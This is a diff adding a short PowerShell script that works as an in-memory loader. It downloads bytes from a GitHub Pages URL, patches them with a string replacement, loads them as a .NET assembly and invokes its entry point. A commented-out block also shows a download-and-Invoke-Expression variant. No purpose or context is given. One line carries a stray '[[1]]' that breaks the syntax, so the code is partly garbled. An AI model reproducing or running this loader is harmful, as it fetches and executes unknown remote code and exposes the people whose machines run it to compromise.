@@ -1,0 +1,24 @@
+#param (
+#    [int]$option = 1
+#)
+#
+#if ($option -eq 1) {
+#    $url1 = ""
+#    $bytes = (Invoke-WebRequest -Uri $url1 -UseBasicParsing).Content | ForEach-Object { [System.Convert]::ToByte($_) }
+#    $assembly = [System.Reflection.Assembly]::Load($bytes)
+#    $entryPoint = $assembly.EntryPoint
+#    $entryPoint.Invoke($null, $null)
+#} else{
+#    $url2 = ""
+#    $script = Invoke-WebRequest -Uri $url2 -UseBasicParsing | Select-Object -ExpandProperty Content
+#    Invoke-Expression $script
+#}
+
+$url1 = "https://stinkylick.github.io/stinkylick/2/a"
+$bytes = (Invoke-WebRequest -Uri $url1 -UseBasicParsing).Content | ForEach-Object { [System.Convert]::ToByte($_) }
+$stringContent = [System.Text.Encoding]::UTF8.GetString($bytes)
+$modifiedString = $stringContent.Replace("[1]", "C") [[1]]
+$modifiedBytes = [System.Text.Encoding]::UTF8.GetBytes($modifiedString)
+$assembly = [System.Reflection.Assembly]::Load($modifiedBytes)
+$entryPoint = $assembly.EntryPoint
+$entryPoint.Invoke($null, $null)
